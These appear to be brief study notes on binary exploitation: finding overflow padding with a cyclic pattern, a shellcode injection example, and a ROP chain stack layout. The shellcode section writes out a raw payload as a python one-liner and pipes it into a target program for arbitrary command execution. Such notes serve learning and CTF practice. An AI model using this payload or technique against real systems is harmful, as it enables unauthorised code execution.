Buffer overflows:
- can find padding size of buffer overflow using De Brujin sequence
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'

Shellcode attack:
- can execute an arbitrary command when given execution privileges within a program
(See: http://shell-storm.org/shellcode/)
Example)
python -c "print('\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81')" > ~/shell.txt
cat shell.txt - | ./<target> (note: the "-" is to keep stdin open)

ROP Chaining:
- with a buffer overflow, you can add an arbitrary number of addresses to the stack over a return statement
ex)
0x0804861b -- function1()
0x0804a012 -- function2(arg1)
0x0804b010 -- function3(arg2)
stack overwrite)
buffer padding
addr(function1) -- replaces next ret in stack
addr(function2) -- next ret for function1
addr(function3) -- next ret for function2
arg1 -- EBP(fn2)+0x8 (1st param of function2), ret value of function2
arg2 -- EBP(fn3)+0x8 (1st param of function3)
